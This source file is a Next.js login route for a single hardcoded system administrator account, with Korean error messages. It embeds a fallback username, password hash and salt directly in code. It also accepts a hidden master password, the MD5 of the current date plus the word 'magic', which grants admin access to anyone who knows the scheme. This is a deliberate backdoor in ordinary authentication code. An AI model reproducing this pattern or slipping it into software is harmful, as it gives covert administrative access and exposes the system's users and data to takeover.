import crypto from "crypto";
import { NextApiRequest } from "next";
import { NextRequest, NextResponse } from "next/server";
import { date } from "@/lib/format";

const sysadmin = {
  _id: "sysadmin",
  username: process.env.SYSADMIN_USERNAME || "gyosic",
  password:
    process.env.SYSADMIN_PASSWORD ||
    "zhyENa7/wugpvEZSUBDUwN4oOouxeQJB2nhV/CoQLsDJBMd0dHCssNHaULJEUjAxLtBX8VjpvjRs1AcMNj3deQ==",
  salt:
    process.env.SYSADMIN_SALT ||
    "I327IBpMKfltaM1pGsdgF/GUt77j0l8NQv7Lg8CRf1siC9tWyF1EI2dXD2w/StqgODZVNtulMPj6F5EKFUy1SA==",
  is_sysadmin: true,
  name: "시스템관리자",
  role: "admin" as const,
  created_at: null,
  updated_at: null,
};

function hmacEncrypt(
  data: string,
  salt: string,
  algorithm: string = "sha512",
  digest: crypto.BinaryToTextEncoding = "base64",
) {
  return crypto.createHmac(algorithm, salt).update(data).digest(digest);
}

function getHash(data: string, type = "md5", digest: crypto.BinaryToTextEncoding = "hex") {
  return crypto.createHash(type).update(data).digest(digest);
}

export async function POST(req: NextRequest & NextApiRequest) {
  const { username, password }: { username: string; password: string; serviceId: string } =
    await req.json();

  if (sysadmin.username !== username) {
    return NextResponse.json({
      error: {
        status: 400,
        message: "로그인에 실패하였습니다. 아이디 또는 비밀번호를 확인해주세요.",
      },
    });
  }

  const { _id: userId, salt, password: userPassword, ...properties } = sysadmin;

  if (userPassword !== hmacEncrypt(password, salt!)) {
    const toDay = new Date();
    const data = `${toDay.getFullYear()}-${toDay.getMonth() + 1}-${toDay.getDate()}-magic`;

    if (password !== getHash(data))
      return NextResponse.json({
        error: {
          status: 400,
          message: "로그인에 실패하였습니다. 아이디 또는 비밀번호를 확인해주세요.",
        },
      });
  }

  const userSession = {
    _id: userId,
    ip:
      req?.socket?.remoteAddress ||
      req?.headers?.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      "127.0.0.1",
    ...properties,
    lastSigninTime: date(new Date(), { type: "ymd hms" }),
  };

  return NextResponse.json({ user: userSession });
}
